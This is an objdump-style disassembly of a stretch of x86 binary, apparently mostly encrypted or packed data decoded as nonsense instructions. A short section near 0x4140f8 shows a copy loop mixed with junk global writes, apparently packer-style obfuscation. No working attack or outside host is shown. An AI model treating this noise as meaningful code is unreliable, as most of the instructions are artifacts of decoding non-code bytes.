  413a60:	fld    DWORD PTR [eax+edi*4+0x46736f0b]
  413a67:	bound  edx,QWORD PTR [edx-0x2bfbf4b1]
  413a6d:	adc    DWORD PTR [eax-0x206165f7],esi
  413a73:	stos   BYTE PTR es:[edi],al
  413a74:	cs scas eax,DWORD PTR es:[edi]
  413a76:	inc    eax
  413a77:	adc    al,0x6
  413a79:	outs   dx,DWORD PTR ds:[esi]
  413a7a:	loopne 0x413a09
  413a7c:	enter  0x52b6,0xfc
  413a80:	push   ebp
  413a81:	ret    
  413a82:	enter  0x871c,0xa8
  413a86:	pop    ebp
  413a87:	outs   dx,BYTE PTR ds:[esi]
  413a88:	ds add eax,0xdd9b1bfd
  413a8e:	mov    esi,0x11ea5be2
  413a93:	mov    ds:0x72616717,eax
  413a98:	mov    al,0x70
  413a9a:	xor    edi,DWORD PTR [ebx]
  413a9c:	mov    edi,0x9a7d8247
  413aa1:	adc    cl,BYTE PTR [ebp+0x23]
  413aa4:	inc    ebp
  413aa5:	fimul  WORD PTR [edx+0x623f834f]
  413aab:	movnti DWORD PTR [ebp+0x8d5d007],edi
  413ab2:	cwde   
  413ab3:	bound  esi,QWORD PTR [ebp-0x79]
  413ab6:	inc    edx
  413ab8:	pop    esi
  413ab9:	adc    edi,DWORD PTR [edi]
  413abb:	jge    0x413aef
  413abd:	xchg   BYTE PTR [esi],cl
  413abf:	add    edi,DWORD PTR [ebp-0x34de0fc7]
  413ac5:	sub    ch,BYTE PTR [ebx-0xea2875b]
  413acb:	icebp  
  413acc:	push   ebx
  413acd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ace:	cdq    
  413acf:	dec    ebx
  413ad0:	out    0xd,al
  413ad2:	inc    ebx
  413ad3:	into   
  413ad4:	mov    al,0x4c
  413ad6:	jg     0x413b03
  413ad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ad9:	xchg   ecx,eax
  413ada:	cmp    esi,DWORD PTR [esi-0x15d33c6e]
  413ae0:	jecxz  0x413a92
  413ae2:	pop    esi
  413ae3:	mov    WORD PTR [edx+0x232e257],es
  413ae9:	lahf   
  413aea:	xchg   esi,eax
  413aeb:	sbb    bh,BYTE PTR [edi+0x3612fa76]
  413af1:	rol    BYTE PTR [edi+0x61],cl
  413af4:	xor    cl,ah
  413af6:	jno    0x413a99
  413af8:	in     eax,0x8e
  413afa:	jp     0x413af2
  413afc:	out    0x48,al
  413afe:	push   ecx
  413aff:	test   DWORD PTR [esi],eax
  413b01:	jg     0x413aa3
  413b03:	and    eax,0x505c784f
  413b08:	push   ebx
  413b09:	ss pushf 
  413b0b:	dec    edi
  413b0c:	add    eax,0xa3b437e1
  413b11:	out    0x53,eax
  413b13:	pushf  
  413b14:	mov    ebp,0x88ec9664
  413b19:	aad    0x14
  413b1b:	test   BYTE PTR [edx],ch
  413b1d:	cmp    al,0x1c
  413b1f:	lods   al,BYTE PTR ds:[esi]
  413b20:	jmp    0x413b10
  413b22:	sbb    al,0x30
  413b24:	jmp    0x413b6f
  413b26:	cwde   
  413b27:	nop
  413b28:	inc    ebx
  413b29:	inc    ebp
  413b2a:	mov    BYTE PTR [ebx-0x72421b2e],bl
  413b30:	mov    al,0x29
  413b32:	xor    al,0xe2
  413b34:	jle    0x413bb4
  413b36:	push   ebx
  413b37:	shl    dl,0x11
  413b3a:	jae    0x413b13
  413b3c:	or     BYTE PTR [edx-0x35],dl
  413b3f:	loop   0x413ae3
  413b41:	push   esp
  413b42:	cmp    al,0x6a
  413b44:	imul   ecx,DWORD PTR [edi-0x692afe7e],0x7c
  413b4b:	fcom   DWORD PTR [esp+ecx*4-0xc]
  413b4f:	adc    al,0xee
  413b51:	into   
  413b52:	jmp    FWORD PTR [edx+eiz*8+0x30]
  413b56:	adc    al,0x1d
  413b58:	bound  edi,QWORD PTR [ebx]
  413b5a:	sbb    eax,0x52acd99a
  413b5f:	lock hlt 
  413b61:	inc    ebp
  413b62:	pop    ebp
  413b63:	fdiv   DWORD PTR [ecx-0x58c982c3]
  413b69:	dec    edi
  413b6a:	nop
  413b6b:	stos   BYTE PTR es:[edi],al
  413b6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b6d:	outs   dx,BYTE PTR ds:[esi]
  413b6e:	rol    BYTE PTR [ebx-0x4e],0x40
  413b72:	repz dec eax
  413b74:	mov    eax,ds:0x325185
  413b79:	mov    ebp,0x57098ec
  413b7e:	adc    BYTE PTR [ecx],ch
  413b80:	retf   0x8fdd
  413b83:	push   esi
  413b84:	adc    DWORD PTR [eax],0xffffff95
  413b87:	out    0x7b,al
  413b89:	or     al,0x95
  413b8b:	lods   al,BYTE PTR ds:[esi]
  413b8c:	or     al,dh
  413b8e:	shl    BYTE PTR [ecx+0x10dbf5e7],0x8c
  413b95:	cs and al,0x35
  413b98:	push   esp
  413b99:	jae    0x413b50
  413b9b:	or     edx,DWORD PTR [ecx+0x55949ab3]
  413ba1:	jne    0x413c07
  413ba3:	scas   eax,DWORD PTR es:[edi]
  413ba4:	pusha  
  413ba5:	and    eax,0xb7ea28f9
  413baa:	sbb    eax,0x2ff3dcb4
  413baf:	(bad)  
  413bb0:	lds    esp,FWORD PTR [esi+0x27d58486]
  413bb6:	jo     0x413bec
  413bb8:	or     eax,0xf696c282
  413bbd:	std    
  413bbe:	mov    edx,0xeeaa1c5f
  413bc3:	pop    ss
  413bc4:	cld    
  413bc5:	sbb    edi,DWORD PTR [ecx*2+0x2f3a8536]
  413bcc:	add    ebx,DWORD PTR [esi-0xc]
  413bcf:	mov    ch,0x64
  413bd1:	xor    al,0x0
  413bd3:	pop    ecx
  413bd4:	ficomp DWORD PTR [esi+0x2c5a891d]
  413bda:	aas    
  413bdb:	cdq    
  413bdc:	sbb    BYTE PTR [ebp+0x5d],al
  413bdf:	cli    
  413be0:	jo     0x413c5d
  413be2:	out    dx,al
  413be3:	inc    ecx
  413be4:	dec    ebp
  413be5:	mov    edi,edx
  413be7:	stc    
  413be8:	push   ebp
  413be9:	aam    0xc
  413beb:	cld    
  413bec:	scas   eax,DWORD PTR es:[edi]
  413bed:	xchg   esi,eax
  413bee:	or     ch,dl
  413bf0:	imul   ebx,DWORD PTR [edi],0xffffffb2
  413bf3:	fnstcw WORD PTR ds:0x7f69db1d
  413bf9:	pop    es
  413bfa:	cli    
  413bfb:	jecxz  0x413beb
  413bfd:	cmp    DWORD PTR [ecx-0x44],esi
  413c00:	sbb    al,0x60
  413c02:	dec    edi
  413c03:	mov    edi,0xa562a4aa
  413c08:	xor    eax,0xd9e96790
  413c0d:	push   edx
  413c0e:	or     BYTE PTR [ebp-0x2f3df73d],dl
  413c14:	push   edx
  413c15:	lea    esi,[eax-0x54d5b198]
  413c1b:	mov    ds:0x98111828,eax
  413c20:	in     eax,dx
  413c21:	call   0xfe22f0fb
  413c26:	aad    0xa2
  413c28:	sti    
  413c29:	call   0xd0527d2c
  413c2e:	jmp    0x413c27
  413c30:	jl     0x413c37
  413c32:	in     al,0x74
  413c34:	sahf   
  413c35:	mov    bl,0x31
  413c37:	popa   
  413c38:	push   ecx
  413c39:	(bad)  [esi-0x36]
  413c3c:	stos   BYTE PTR es:[edi],al
  413c3d:	ins    DWORD PTR es:[edi],dx
  413c3e:	push   es
  413c3f:	mov    ecx,0xc920e6e5
  413c44:	sub    al,0xa4
  413c46:	and    bh,0xaf
  413c49:	mov    esi,0x25bf64a4
  413c4e:	rcr    DWORD PTR [esi+eiz*2-0x48],1
  413c52:	imul   ecx,edx,0x4eb4db87
  413c58:	aaa    
  413c59:	int3   
  413c5a:	or     bl,BYTE PTR [edx-0x8e12540]
  413c60:	xor    DWORD PTR [eax+ebp*8+0x330905f8],esp
  413c67:	cmp    dh,BYTE PTR [esi+0x1a18de5]
  413c6d:	mov    BYTE PTR [ecx+eax*1+0x71f5fb84],dh
  413c74:	lods   eax,DWORD PTR ds:[esi]
  413c75:	adc    DWORD PTR [ecx-0x43c2149d],0x13
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	(bad)  
  413c7e:	lods   al,BYTE PTR ds:[esi]
  413c7f:	and    DWORD PTR [ebp+edx*8+0x41a2cc9e],edx
  413c86:	stc    
  413c87:	jne    0x413c74
  413c89:	imul   eax,DWORD PTR [edx],0xe9604a0c
  413c8f:	inc    ecx
  413c90:	ins    BYTE PTR es:[edi],dx
  413c91:	sub    BYTE PTR [edi+0x66],dh
  413c94:	pop    esp
  413c95:	mov    DWORD PTR [edi],ebp
  413c97:	cmp    eax,0x9d4366b0
  413c9c:	fcomp  QWORD PTR [edi+esi*1-0x40bc1f3a]
  413ca3:	cmp    ecx,esi
  413ca5:	in     al,dx
  413ca6:	add    al,BYTE PTR [ecx]
  413ca8:	push   edi
  413ca9:	jae    0x413cb7
  413cab:	dec    edi
  413cac:	jo     0x413d24
  413cae:	shr    al,cl
  413cb0:	xchg   esp,eax
  413cb1:	and    al,0x3
  413cb3:	retf   0x9b8
  413cb6:	cmp    eax,0xe0523cf8
  413cbb:	(bad)  
  413cbc:	jmp    0x413c8f
  413cbe:	or     eax,0xb335540c
  413cc3:	out    dx,al
  413cc4:	(bad)  
  413cc5:	shr    DWORD PTR [ebx],0x26
  413cc8:	js     0x413cc6
  413cca:	addr16 mov al,ds:0xd622
  413cce:	xchg   ebx,eax
  413ccf:	fistp  QWORD PTR [edi+0x96b0a09]
  413cd5:	sbb    al,0x49
  413cd7:	cmc    
  413cd8:	je     0x413c64
  413cda:	shrd   DWORD PTR [esi-0x1c],ecx,cl
  413cde:	xor    DWORD PTR [esp+eax*4-0x30ffc560],0x6d071760
  413ce9:	mov    ?,WORD PTR [eax]
  413ceb:	(bad)  
  413cec:	das    
  413ced:	mov    cl,0xbf
  413cef:	jecxz  0x413c9d
  413cf1:	cmp    eax,0x5666d991
  413cf6:	inc    edi
  413cf7:	retf   0xee99
  413cfa:	sub    al,0xbc
  413cfc:	jbe    0x413c91
  413cfe:	jg     0x413d11
  413d00:	dec    eax
  413d01:	ret    0x7563
  413d04:	mov    BYTE PTR [esp+esi*8+0x62d0e9be],ch
  413d0b:	sbb    al,0xd0
  413d0d:	loop   0x413d2e
  413d0f:	pop    ss
  413d10:	pop    eax
  413d11:	addr16 aad 0xad
  413d14:	mov    ds:0xd74dd5d8,eax
  413d19:	jecxz  0x413d8e
  413d1b:	fidivr DWORD PTR es:[ecx-0x78ca416d]
  413d22:	lock pop ebp
  413d24:	mov    esi,0x81f0734
  413d29:	fs int 0x44
  413d2c:	sbb    al,0x2
  413d2e:	mov    edx,0x6c204e8d
  413d33:	xor    BYTE PTR [ebx-0x30028182],dl
  413d39:	inc    ecx
  413d3a:	cwde   
  413d3b:	pushf  
  413d3c:	das    
  413d3d:	lods   eax,DWORD PTR ds:[esi]
  413d3e:	nop
  413d3f:	neg    ebx
  413d41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d42:	jno    0x413da2
  413d44:	in     al,dx
  413d45:	add    bl,BYTE PTR ds:0x304f2a9c
  413d4b:	retf   
  413d4c:	int3   
  413d4d:	xlat   BYTE PTR ds:[ebx]
  413d4e:	adc    ebx,DWORD PTR [edi-0x1bb35d55]
  413d54:	pop    es
  413d55:	jmp    0x413d2c
  413d57:	scas   eax,DWORD PTR es:[edi]
  413d58:	pop    edi
  413d59:	ffree  st(2)
  413d5b:	mov    ah,BYTE PTR [esp+ecx*2-0xf6ad461]
  413d62:	rol    BYTE PTR [ebx-0x57ad1a28],1
  413d68:	jmp    0x364:0xb1031397
  413d6f:	xchg   edi,eax
  413d70:	inc    ebp
  413d71:	xor    ch,BYTE PTR [eax+0x7c]
  413d74:	sub    al,0x55
  413d76:	sub    al,0x2d
  413d78:	iret   
  413d79:	xchg   ecx,eax
  413d7a:	fwait
  413d7b:	ins    DWORD PTR es:[edi],dx
  413d7c:	(bad)  
  413d7e:	push   esp
  413d7f:	sbb    BYTE PTR [ebp+0x2b],ch
  413d82:	aad    0x94
  413d84:	mul    ebp
  413d86:	addr16 mov edx,0x6e32347c
  413d8c:	push   ds
  413d8d:	sub    eax,0x6a6f6fc4
  413d92:	cmp    DWORD PTR [ebx],ebx
  413d94:	cmp    eax,0x44700777
  413d99:	jmp    0x15fb3df
  413d9e:	pop    eax
  413d9f:	xchg   esp,eax
  413da0:	or     ebx,DWORD PTR [ecx+0x2ae24e40]
  413da6:	retf   
  413da7:	mov    ebx,0xc32e7714
  413dac:	xchg   bh,bh
  413dae:	jo     0x413d8f
  413db0:	add    al,0x63
  413db2:	jg     0x413d44
  413db4:	add    BYTE PTR [eax+0x7fd19650],ah
  413dba:	push   esp
  413dbb:	or     BYTE PTR [edx+esi*2+0xc0dfd4],bl
  413dc2:	iret   
  413dc3:	mov    esp,0x66e699be
  413dc8:	call   0x54f368a5
  413dcd:	outs   dx,BYTE PTR ds:[esi]
  413dce:	test   BYTE PTR [edx-0x13],bh
  413dd1:	fs cld 
  413dd3:	pop    edx
  413dd4:	xchg   BYTE PTR [ecx],al
  413dd6:	mov    DWORD PTR [eax-0x6b],eax
  413dd9:	dec    edi
  413dda:	imul   ecx
  413ddc:	inc    edx
  413ddd:	mov    edx,0xdc1fdcf8
  413de2:	push   esi
  413de3:	dec    eax
  413de4:	js     0x413db1
  413de6:	call   0x7a1d:0xb045aa13
  413ded:	dec    ebp
  413dee:	inc    esp
  413def:	aam    0xd2
  413df1:	sub    dh,BYTE PTR [ebx-0x5a9bc16b]
  413df7:	loop   0x413dfb
  413df9:	das    
  413dfa:	adc    eax,0xc321f9d5
  413dff:	pop    ebp
  413e00:	call   0xf2cd:0xb57d66e4
  413e07:	(bad)  
  413e08:	repnz shl dl,cl
  413e0b:	mov    ds:0xa73df679,eax
  413e10:	jmp    0x413d9b
  413e12:	out    0x5b,al
  413e14:	into   
  413e15:	loop   0x413e70
  413e17:	cli    
  413e18:	push   esi
  413e19:	call   0xead5:0x3c263469
  413e20:	es mov ebx,0xfc9e2c9
  413e26:	xchg   ecx,eax
  413e27:	pop    ebx
  413e28:	retf   
  413e29:	adc    BYTE PTR [ebx],al
  413e2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e2c:	cld    
  413e2d:	clc    
  413e2e:	mov    ecx,ebx
  413e30:	dec    edx
  413e31:	xor    ebx,ebx
  413e33:	dec    ecx
  413e34:	repz xor DWORD PTR [esi+0x504e9fb4],edi
  413e3b:	dec    ebx
  413e3c:	jl     0x413eae
  413e3e:	std    
  413e3f:	and    BYTE PTR [ebp-0x65],0xa2
  413e43:	fnstsw WORD PTR [ebp-0x64f8a1c]
  413e49:	aad    0x90
  413e4b:	rol    bh,0x4b
  413e4e:	mov    ebp,0xc317c419
  413e53:	and    ebp,ebx
  413e55:	dec    edi
  413e56:	mov    bh,0xe8
  413e58:	aaa    
  413e59:	mov    dl,0xe8
  413e5b:	sub    DWORD PTR [ebx],esi
  413e5d:	push   ss
  413e5e:	retf   
  413e5f:	test   DWORD PTR [ecx],ebp
  413e61:	retf   0x962a
  413e64:	xchg   edx,eax
  413e65:	cmp    eax,eax
  413e67:	xor    BYTE PTR [edi+0x10385220],0x59
  413e6e:	inc    edx
  413e6f:	imul   ebx,eax,0x328e6c04
  413e75:	sbb    edi,DWORD PTR [ecx-0x8f6cd8f]
  413e7b:	jl     0x413ef6
  413e7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e7e:	xlat   BYTE PTR ds:[ebx]
  413e7f:	adc    DWORD PTR [edi+edi*4-0x49],ebx
  413e83:	pop    ds
  413e84:	loopne 0x413ef8
  413e86:	div    BYTE PTR [edi-0x73ae76e]
  413e8c:	mov    ecx,cs
  413e8e:	retf   
  413e8f:	arpl   si,ax
  413e91:	cmp    DWORD PTR [ebp+0xf],ebx
  413e94:	mov    ebp,0x2113fbb9
  413e99:	ret    
  413e9a:	test   cl,ah
  413e9c:	ss loop 0x413e57
  413e9f:	das    
  413ea0:	lock xchg DWORD PTR [ecx-0x34],ebx
  413ea4:	sahf   
  413ea5:	sbb    DWORD PTR [ebp-0x7df2844b],edx
  413eab:	ror    cl,cl
  413ead:	adc    eax,edx
  413eaf:	pop    ds
  413eb0:	mov    dh,0xcf
  413eb2:	inc    ecx
  413eb3:	nop
  413eb4:	xor    al,0xeb
  413eb6:	pop    esi
  413eb7:	push   0x53400f0a
  413ebc:	pop    edx
  413ebd:	or     esi,DWORD PTR [edi+0xbc76a7d]
  413ec3:	fidiv  DWORD PTR [edx]
  413ec5:	add    ebp,DWORD PTR [esi-0x27]
  413ec8:	xchg   bx,ax
  413eca:	(bad)  
  413ecb:	adc    cl,BYTE PTR [ebp-0x28]
  413ece:	retf   0xe3a1
  413ed1:	xor    dl,bl
  413ed3:	stos   BYTE PTR es:[edi],al
  413ed4:	lock test al,0x28
  413ed7:	enter  0xb323,0x64
  413edb:	aam    0x19
  413edd:	cld    
  413ede:	push   0x21
  413ee0:	cmp    BYTE PTR [ebx-0x3e361543],ah
  413ee6:	sbb    bh,BYTE PTR [ebp-0x63]
  413ee9:	mov    ebp,0xe08e83b6
  413eee:	pop    ax
  413ef0:	outs   dx,DWORD PTR ds:[esi]
  413ef1:	out    0xf4,al
  413ef3:	mov    dh,0x9b
  413ef5:	fwait
  413ef6:	or     BYTE PTR [edi-0x12458f5e],ah
  413efc:	inc    ecx
  413efd:	mov    ebp,DWORD PTR [ebx-0x5c]
  413f00:	imul   edi,DWORD PTR [ecx],0x4e
  413f03:	xor    bh,BYTE PTR ds:0x49c43566
  413f09:	call   0x17a:0xdb67b448
  413f10:	adc    eax,0x2c64b572
  413f15:	(bad)  
  413f16:	int3   
  413f17:	mov    bh,BYTE PTR [ebx+0x34651f37]
  413f1d:	adc    BYTE PTR ds:0xed133b2e,cl
  413f23:	arpl   WORD PTR [ebx+0x35],di
  413f26:	into   
  413f27:	jnp    0x413f38
  413f29:	push   cs
  413f2a:	add    ecx,edx
  413f2c:	mov    ds:0x8d06fadf,eax
  413f31:	pop    eax
  413f32:	(bad)  [eax-0x702199fc]
  413f38:	add    DWORD PTR [ebp+0x66b9fa88],0xffffffb9
  413f3f:	fwait
  413f40:	lea    esp,[eax]
  413f42:	jb     0x413f93
  413f44:	push   ebp
  413f45:	in     al,0x7a
  413f47:	mov    edx,0xf8be5aa1
  413f4c:	cdq    
  413f4d:	or     bl,bh
  413f4f:	(bad)  
  413f51:	xchg   ebx,eax
  413f52:	shl    BYTE PTR [esi+0x31afa6c5],1
  413f58:	mov    bl,0xcf
  413f5a:	pop    ebp
  413f5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f5c:	arpl   WORD PTR gs:[ebp-0x11],si
  413f60:	inc    edi
  413f61:	repnz push esi
  413f63:	adc    eax,0x3cf71c03
  413f68:	mov    DWORD PTR [esi],esp
  413f6a:	sbb    al,BYTE PTR [edx+0x46699a76]
  413f70:	lea    edi,[esi-0x35c89539]
  413f76:	popa   
  413f77:	xlat   BYTE PTR ds:[ebx]
  413f78:	fld    DWORD PTR [edi+edx*2+0x1d]
  413f7c:	fstp   st(7)
  413f7e:	fadd   DWORD PTR [edi+0x48bbc9]
  413f84:	cmp    BYTE PTR [ecx+0x25220bd5],bh
  413f8a:	jecxz  0x413f37
  413f8c:	jmp    0x413fae
  413f8e:	cmp    eax,0xd17203d7
  413f93:	sbb    BYTE PTR [ebp-0x63dc8442],0x5d
  413f9a:	mov    esp,0x69b80403
  413f9f:	in     al,dx
  413fa0:	and    BYTE PTR [edi],dl
  413fa2:	out    0x64,al
  413fa4:	lods   eax,DWORD PTR ds:[esi]
  413fa5:	scas   al,BYTE PTR es:[edi]
  413fa6:	mov    bh,0x44
  413fa8:	jl     0x413f87
  413faa:	push   ebp
  413fab:	lods   eax,DWORD PTR ds:[esi]
  413fac:	loopne 0x413f7b
  413fae:	and    al,0x71
  413fb0:	jge    0x413ff5
  413fb2:	sbb    al,0x49
  413fb4:	mov    esi,0x8c0bc6a5
  413fb9:	popa   
  413fba:	mov    edi,0xbfb5a96f
  413fbf:	inc    edx
  413fc0:	(bad)  
  413fc1:	(bad)
  413fc5:	lock adc eax,0xb9890b2b
  413fcb:	fwait
  413fcc:	arpl   WORD PTR [eax-0x47d063e0],sp
  413fd2:	mov    DWORD PTR [esi+0x58],edx
  413fd5:	fucomip st,st(3)
  413fd7:	push   cs
  413fd8:	in     al,dx
  413fd9:	into   
  413fda:	mov    ch,0xea
  413fdc:	sbb    BYTE PTR [ebx],bh
  413fde:	scas   eax,DWORD PTR es:[edi]
  413fdf:	pushf  
  413fe0:	dec    ebp
  413fe1:	xchg   ebx,eax
  413fe2:	and    eax,0xffcfc54c
  413fe7:	lods   eax,DWORD PTR ds:[esi]
  413fe8:	lods   al,BYTE PTR ds:[esi]
  413fe9:	outs   dx,BYTE PTR ds:[esi]
  413fea:	mov    esp,0x61aa1a2c
  413fef:	mov    ch,0xee
  413ff1:	mov    ch,0x71
  413ff3:	adc    bl,BYTE PTR [edx-0x1aa46dae]
  413ff9:	stos   BYTE PTR es:[edi],al
  413ffa:	mov    dh,0x67
  413ffc:	adc    BYTE PTR [ebx],al
  413ffe:	sub    eax,0x31082a84
  414003:	lahf   
  414004:	sbb    ebx,DWORD PTR [esi+esi*2-0x5d]
  414008:	ins    BYTE PTR es:[edi],dx
  414009:	cdq    
  41400a:	jg     0x413fd9
  41400c:	push   ebp
  41400d:	mov    ds:0xf904147f,al
  414012:	or     BYTE PTR [esi+0x4],al
  414015:	mov    eax,0x775cd12c
  41401a:	inc    edi
  41401b:	jbe    0x413fa7
  41401d:	jnp    0x41406e
  41401f:	mov    ecx,0xb47487ca
  414024:	sti    
  414025:	pop    esi
  414026:	push   ds
  414027:	xchg   BYTE PTR [eax+0x31],cl
  41402a:	ret    0x1c14
  41402d:	(bad)  
  41402f:	xor    al,0xa3
  414031:	xchg   al,bl
  414033:	mov    DWORD PTR [ebp+0x65],0x634d4f2a
  41403a:	mov    ds:0xeb2f30fe,eax
  41403f:	cmp    cl,BYTE PTR [esi]
  414041:	pop    DWORD PTR [edx]
  414043:	rol    edx,cl
  414045:	outs   dx,DWORD PTR ds:[esi]
  414046:	sti    
  414047:	inc    ebx
  414048:	aad    0xd2
  41404a:	add    BYTE PTR [edx],cl
  41404c:	sbb    DWORD PTR [ebp+0x2d9fa3b0],esp
  414052:	pop    edi
  414053:	retf   
  414054:	test   DWORD PTR [edx-0x59],edi
  414057:	stos   BYTE PTR es:[edi],al
  414058:	cmp    al,0xeb
  41405a:	push   0xadc3258c
  41405f:	pop    esp
  414060:	test   eax,0xeb16817a
  414065:	push   edi
  414066:	clc    
  414067:	gs mov dl,BYTE PTR gs:[eax]
  41406b:	es das 
  41406d:	rcl    DWORD PTR [ebx],cl
  41406f:	je     0x413ff3
  414071:	aam    0x74
  414073:	cdq    
  414074:	xchg   edi,eax
  414075:	adc    eax,0xa25e244
  41407a:	fwait
  41407b:	dec    edi
  41407c:	and    BYTE PTR [edx],bh
  41407e:	hlt    
  41407f:	mov    ch,0x2a
  414081:	sub    BYTE PTR [ecx],ch
  414083:	ficom  DWORD PTR [ecx+ebp*8-0x51a0748c]
  41408a:	xchg   ebp,eax
  41408b:	shl    DWORD PTR [ecx-0x1c],cl
  41408e:	xchg   ebp,eax
  41408f:	stos   BYTE PTR es:[edi],al
  414090:	data16 jp 0x4140d2
  414093:	and    BYTE PTR [eax+ebx*8-0x1763cbb8],dh
  41409a:	push   cs
  41409b:	popw   ss
  41409d:	aad    0x82
  41409f:	sbb    BYTE PTR [ecx],ah
  4140a1:	push   cs
  4140a2:	sbb    eax,esp
  4140a4:	pop    ds
  4140a5:	mov    edi,0x9b013bfd
  4140aa:	cmp    al,0x8c
  4140ac:	jp     0x414073
  4140ae:	ret    0x9ec6
  4140b1:	dec    edx
  4140b2:	xor    ecx,DWORD PTR [esi+0x32d7c71d]
  4140b8:	or     DWORD PTR [esi-0x8],0xfffffff7
  4140bc:	mov    ah,0x39
  4140be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140bf:	mov    edx,0xcab7468d
  4140c4:	repz jbe 0x4140c4
  4140c7:	sub    edi,0x22
  4140ca:	jb     0x414139
  4140cc:	sub    al,0xc2
  4140ce:	shl    BYTE PTR [ebp+eax*1-0x47a95ca2],1
  4140d5:	scas   eax,DWORD PTR es:[edi]
  4140d6:	or     BYTE PTR [ecx+0x7],dl
  4140d9:	and    DWORD PTR ds:0x428e2b,ebx
  4140df:	xor    ecx,eax
  4140e1:	mov    esi,0x3272f6
  4140e6:	adc    DWORD PTR ds:0x428e4b,0x428e8b
  4140f0:	push   edi
  4140f1:	add    ecx,esi
  4140f3:	jmp    0x414117
  4140f8:	mov    DWORD PTR ds:0x428e8b,0x6fd6
  414102:	mov    dl,BYTE PTR [ebp-0x1]
  414105:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41410c:	mov    DWORD PTR ds:0x428e83,0x304c
  414116:	inc    ecx
  414117:	cmp    ecx,0x40
  41411a:	jb     0x4140f8
  414120:	mov    edx,DWORD PTR [ebp-0x18]
  414123:	and    DWORD PTR ds:0x428e93,0x604b
  41412d:	xor    edx,eax
  41412f:	add    edx,esi
  414131:	mov    DWORD PTR ds:0x428e57,0x4fc2
  41413b:	jmp    0x416578
  414140:	and    ecx,edi
  414142:	mov    edi,DWORD PTR [ebp+0x8]
  414145:	neg    ecx
  414147:	mov    ecx,0x8a9b
  41414c:	and    DWORD PTR ds:0x428ecf,0x428ec3
  414156:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41415b:	mov    DWORD PTR ds:0x428eaf,0x4944
  414165:	mov    edi,0x3b5d
  41416a:	and    DWORD PTR ds:0x428ea7,0x428e4b
  414174:	add    cx,di
  414177:	movzx  ecx,cx
  41417a:	xor    DWORD PTR ds:0x428e67,0x5c37
  414184:	mov    DWORD PTR [ebp-0xc],ecx
  414187:	mov    ecx,DWORD PTR [ebp+0x8]
  41418a:	jmp    0x416543
  41418f:	lea    edi,[esp+ebp*8]
  414192:	sub    ecx,esp
  414194:	stos   DWORD PTR es:[edi],eax
  414195:	test   BYTE PTR [edx+ecx*1-0x1f95c7a7],dl
  41419c:	cmp    al,0x18
  41419e:	mov    bl,0x95
  4141a0:	push   0x60e78382
  4141a5:	add    DWORD PTR [ebx-0x205acfd],0x15
  4141ac:	xchg   edx,eax
  4141ad:	out    0xfd,al
  4141af:	push   ebx
  4141b0:	or     BYTE PTR [ebp-0x7d],bh
  4141b3:	push   esi
  4141b4:	popf   
  4141b5:	fld    TBYTE PTR [ecx+eax*4]
  4141b8:	or     DWORD PTR [eax-0x19e2696e],ebp
  4141be:	mov    ah,BYTE PTR [edx-0x6ae2fe88]
  4141c4:	push   ebp
  4141c6:	mov    eax,0xd585b24b
  4141cb:	sbb    esp,DWORD PTR [ebp-0x1e]
  4141ce:	sub    DWORD PTR [ecx+0x35f64743],esi
  4141d4:	test   al,0xcd
  4141d6:	fild   WORD PTR [eax]
  4141d8:	out    dx,al
  4141d9:	adc    al,BYTE PTR [ebp+ecx*4+0x6c]
  4141dd:	scas   eax,DWORD PTR es:[edi]
  4141de:	cbw    
  4141e0:	int3   
  4141e1:	mov    al,ds:0x93d43604
  4141e6:	clc    
  4141e7:	adc    DWORD PTR [ecx+0x30d229b3],ebx
  4141ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141ee:	push   ecx
  4141ef:	dec    edx
  4141f1:	out    0x1e,eax
  4141f3:	xchg   esp,eax
  4141f4:	in     al,0xcf
  4141f6:	imul   eax,DWORD PTR [edx-0x14],0xf1f84df2
  4141fd:	rcl    BYTE PTR [ebp+edx*2-0x73be3f5a],1
  414204:	jl     0x4141e3
  414206:	xor    ecx,DWORD PTR [ebp+eiz*1+0x26]
  41420a:	inc    ebp
  41420b:	xor    DWORD PTR [ecx],ebp
  41420d:	ins    BYTE PTR es:[edi],dx
  41420e:	stc    
  41420f:	(bad)  
  414212:	or     cl,BYTE PTR [edx+0x1b]
  414215:	stos   DWORD PTR es:[edi],eax
  414216:	sbb    dh,BYTE PTR [eax]
  414218:	jnp    0x414290
  41421a:	pusha  
  41421b:	push   esi
  41421c:	xchg   esp,eax
  41421d:	mov    cl,BYTE PTR [ecx+edx*8]
  414220:	jle    0x4141ea
  414222:	inc    edx
  414223:	icebp  
  414224:	pop    es
  414225:	(bad)  
  414226:	outs   dx,DWORD PTR ds:[esi]
  414227:	retf   0x2059
  41422a:	adc    ebx,0xffffff90
  41422d:	call   0xf53160a6
  414232:	mov    dl,0xbd
  414234:	stos   DWORD PTR es:[edi],eax
  414235:	loopne 0x4141fd
  414237:	shl    DWORD PTR [edx+0x1],0xf5
  41423b:	xor    esi,DWORD PTR [ebp+0x9]
  41423e:	jb     0x41421a
  414240:	ins    DWORD PTR es:[edi],dx
  414241:	test   ah,cl
  414243:	mov    ebx,cs
  414245:	(bad)  [esi]
  414247:	lds    ebx,FWORD PTR [ebp+0x6c2154e9]
  41424d:	push   es
  41424e:	sub    ebx,DWORD PTR [edi]
  414250:	xchg   esp,eax
  414251:	leave  
  414252:	es jmp 0x813d:0xa78b5031
  41425a:	xor    dh,al
  41425c:	rol    DWORD PTR [esi-0x48],1
  41425f:	fild   DWORD PTR [edx-0x27]
  414262:	repz test BYTE PTR [edx-0x22448d27],bh
  414269:	dec    ebp
  41426a:	xor    ebp,DWORD PTR [esi]
  41426c:	not    DWORD PTR [ebx+0x2980d6bd]
  414272:	scas   eax,DWORD PTR es:[edi]
  414273:	xor    BYTE PTR [edx+ebx*1-0x32],ah
  414277:	test   BYTE PTR [esi+eax*4-0x338eafff],al
  41427e:	or     al,0xb8
  414280:	jmp    0xd93e:0x9dcbe804
  414287:	pusha  
